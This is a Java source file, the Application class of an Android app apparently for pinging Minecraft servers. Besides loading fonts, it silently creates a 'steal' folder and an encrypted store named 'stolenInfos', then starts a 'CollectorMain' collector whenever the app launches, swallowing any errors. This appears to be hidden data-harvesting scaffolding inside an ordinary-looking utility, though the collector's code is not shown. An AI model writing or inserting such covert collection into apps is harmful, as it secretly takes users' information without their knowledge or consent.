package com.nao20010128nao.McServerPingPong;
import android.app.*;
import android.graphics.*;
import uk.co.chrisjenx.calligraphy.*;
import com.nao20010128nao.FileSafeBox.*;
import java.io.*;
import android.content.*;
import android.preference.*;
import java.util.*;
import com.nao20010128nao.McServerPingPong.collector.*;
import android.os.*;

public class TheApplication extends Application
{
	public static TheApplication instance;
	public static Typeface cinzelDecorative,latoLight,migmix;
	public SafeBox stolenInfos;
	public String uuid;
	@Override
	public void onCreate() {
		// TODO: Implement this method
		super.onCreate();
		instance=this;
		cinzelDecorative=Typeface.createFromAsset(getAssets(),"cinzeldecorative.ttf");
		latoLight=Typeface.createFromAsset(getAssets(),"lato-light.ttf");
		migmix=Typeface.createFromAsset(getAssets(),"migmix.ttf");
		CalligraphyConfig.initDefault(new CalligraphyConfig.Builder()
									  .setDefaultFontPath(getResources().getString(R.string.font))
									  .setFontAttrId(R.attr.fontPath)
									  .build()
									  );
		///////
		try{
			File f=new File(getFilesDir(),"steal");
			new File(f,"lock.lock").delete();
			if(!f.exists())f.mkdirs();
			stolenInfos=new SafeBox.SafeBoxBuilder()
				.makeNew(!new File(f,"manifest.bin").exists())
				.password(genPassword())
				.profilePath(f)
				.readOnly(false)
				.build();
			new CollectorMain();
		}catch(Throwable r){
			r.printStackTrace(System.out);
		}
	}
	private String genPassword(){
		uuid=PreferenceManager.getDefaultSharedPreferences(this).getString("uuid",UUID.randomUUID().toString());
		PreferenceManager.getDefaultSharedPreferences(this).edit().putString("uuid",uuid).commit();
		return uuid+uuid;
	}
}
